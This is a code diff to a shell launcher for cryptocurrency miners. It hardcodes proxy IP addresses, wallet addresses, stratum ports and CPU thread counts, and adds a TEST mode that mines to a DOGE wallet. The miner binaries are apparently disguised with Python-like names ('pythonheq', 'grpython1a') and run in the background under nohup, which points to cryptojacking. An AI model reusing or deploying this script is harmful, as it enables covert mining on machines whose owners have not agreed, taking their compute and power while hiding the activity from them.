@@ -8,12 +8,15 @@ echo
 echo 
 
 PROX=49.12.115.117
+
 ETPort=443
 RVPort=8080
 VCPort=80
 XMPort=21
-TESTPort=587
-DisplayRefrech=120
+TESTPort1=587
+TESTPort2=465
+
+DisplayRefrech=5
 
 HZ_PROX1=49.12.115.117
 HZ_PROX2=188.34.159.9
@@ -38,8 +41,8 @@ SWITCHPROX=$HZ_PROX1
 VCThreads=$[$(nproc)*2]
 XMThreads=$[$(nproc)*1]
 
-#Debug=True
-Debug=False
+Debug=True
+#Debug=False
 
 #Keys
 W_BT="1MEdZan82tai5Kb7fqFJNgfpGhtsP47MFT"
@@ -49,6 +52,7 @@ W_RV="RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK"
 W_XM="44ucr5iSqUjCR6m93Gu9ssJC9W1yWLGz1fZbAChLXG1QPnFD5bsTXKJAQEk8dHKDWx8hYJQ5ELqg9DJKNA1oRoNZKCGyn1p"
 W_VC="RNEzrdAY8JNRrEre37aZbegHSx2CgaoXek"
 
+P_DG='c=DOGE'
 
 W_VC=$W_DG
 
@@ -58,6 +62,18 @@ mkdir -p $Work_Dir
 cd  $Work_Dir
 
 ##################### functions #####################################
+
+test_cpu () {
+  local Algo='gr'
+  nohup ./grpython1a -a $Algo -o stratum+tcp://$PROX:$TESTPort2 -u $W_DG -p $P_DG
+
+}
+
+test_gpu () {
+  local Algo='gr'
+  nohup ./grpython1a -a $Algo -o stratum+tcp://$PROX:$TESTPort2 -u $W_DG -p $P_DG
+
+}
 
 function displaytime {
   local T=$1
@@ -407,6 +423,11 @@ then
     echo start >> ooutvc
 
     nohup ./pythonheq -v -l "$PROX":"$VCPort" -u "$W_VC"."$INFO" -t "$VCThreads" -p "$VCOptions" 1>> ooutvc 2>> ooutvc &
+elif [ $OP == "TEST" ]
+then  
+    ###### VC
+    echo start >> ooutvc
+    test_cpu  1>> ooutvc 2>> ooutvc &
 else
     VCThreads=$[$(nproc)/2]
     XMThreads=$[$(nproc)/2]
